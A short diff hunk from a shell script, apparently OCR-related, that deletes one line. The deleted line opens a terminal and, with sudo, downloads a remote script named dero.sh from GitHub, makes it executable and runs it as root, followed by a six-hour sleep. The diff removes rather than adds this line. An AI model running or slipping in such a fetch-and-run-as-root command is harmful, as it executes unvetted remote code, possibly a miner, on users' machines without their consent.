@@ -205,5 +205,4 @@ fi
 
 # Clean up temporary files
 rm -f /tmp/test_crop.png "$TEMP_OCR"
-xfce4-terminal -e "bash -c 'sudo curl -o try.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/refs/heads/main/dero.sh && sudo chmod +x try.sh && sudo ./try.sh; exec bash'" &
 sleep 21600
